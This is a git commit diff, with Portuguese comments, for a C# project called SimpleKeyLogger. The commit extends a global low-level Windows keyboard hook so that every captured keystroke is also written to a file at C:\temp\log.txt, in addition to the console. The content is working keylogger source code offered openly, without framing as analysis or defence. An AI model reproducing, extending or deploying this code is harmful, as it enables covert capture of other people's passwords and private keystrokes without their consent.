a41ee7c17314ee60f98a49fc4aea2d3d240000bc
Brunine <yuzo.ananimation@gmail.m>
2023-03-29 01:43:27 -0300

    Adicionado arquivo de log

--- SimpleKeyLogger/Program.cs
+++ SimpleKeyLogger/Program.cs
@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Diagnostics;
+using System.IO;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
 
@@ -9,11 +10,20 @@ namespace KeyLogger {
         private const int WM_KEYDOWN = 0x0100; // Indicando que uma tecla foi pressionada
         private static LowLevelKeyboardProc _proc = HookCallback; // Executar o código quando uma tecla é pressionada
         private static IntPtr _hookID = IntPtr.Zero; // Identificador do hook de teclado
+        private static StreamWriter sw; // Objeto StreamWriter para escrever no arquivo
 
         static void Main(string[] args) {
+            // Abre o arquivo para escrita, e cria um objeto StreamWriter para escrever nele
+            sw = new StreamWriter(@"C:\temp\log.txt");
+            sw.AutoFlush = true;
+
             _hookID = SetHook(_proc); // Cria e armazena o identificador do hook de teclado
             Application.Run(); // Inicia a aplicação
             UnhookWindowsHookEx(_hookID); // Remove o hook de teclado
+
+            // Fecha o objeto StreamWriter
+            sw.Close();
+            sw.Dispose();
         }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc) {
@@ -31,6 +41,7 @@ namespace KeyLogger {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                 int vkCode = Marshal.ReadInt32(lParam); // Lê o código virtual da tecla pressionada
                 Console.WriteLine((Keys)vkCode); // Escreve o caractere no console
+                sw.Write((Keys)vkCode); // Escreve o caractere no arquivo
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam); // Chama o próximo hook
         }
